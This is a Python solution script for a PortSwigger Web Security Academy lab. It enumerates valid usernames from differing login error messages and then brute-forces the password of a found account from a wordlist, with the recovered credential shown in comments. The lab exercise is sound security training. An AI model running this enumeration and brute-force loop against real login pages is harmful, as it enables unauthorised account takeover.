# Lab: Username enumeration via different responses

import requests
from pathlib import Path

base = "https://0a99007b030f826d812fc557005e00b3.web-security-academy.net"
guess_session = requests.Session()

print("===========[step1] Recon login fail message===============")
page_recon_login=guess_session.post(f"{base}/login", data={"username": "test", "password": "1234"})
page_recon_result=page_recon_login.text
print(page_recon_result)
'''
[!] Important finding: Invalid username
=> told us what is wrong exactly
                        <p class=is-warning>Invalid username</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
'''

print("===========[step2] prep files for login bruteforce===============")
# prep username/password list (provided by portswigger's academy)
cwd = Path(__file__).resolve().parent
userid_file = cwd / "username.txt" 
pass_file = cwd / "password.txt"

with open(userid_file, "r", encoding="utf-8") as usernamefile:
    username_content=usernamefile.read()

username_list=username_content.splitlines()

with open(pass_file, "r", encoding="utf-8") as passfile:
    pass_content=passfile.read()

pass_list=pass_content.splitlines()

# list for account which can successfully login
print()
print("[*] Ready to Brute Force")
print()
valid_account = []
print("===========[step3] Find Valid Account===============")
for username in username_list:
    page_login=guess_session.post(f"{base}/login", data={"username": username, "password": "1234"}, allow_redirects=False)
    if "Invalid username" not in page_login.text:
        print(f"trying to find {username}'s password")
        for password in pass_list:
            page_login=guess_session.post(f"{base}/login", data={"username": username, "password": password}, allow_redirects=False)
            if "Incorrect password" not in page_login.text:
                print(f"Found Valid credentail id: {username}, pw: {password}")
                valid_account.append({username : password})
                break
'''
If password invalid returns "Incorrect password"
                       <p class=is-warning>Incorrect password</p>
'''
print()
print("[*] Listing Found Credentials")
for i, account in enumerate(valid_account, start=1):
    print(f"[{i}] {account}")
print()

'''
Found 1 valid Credential:

[1] {'acceso': 'mom'}

'''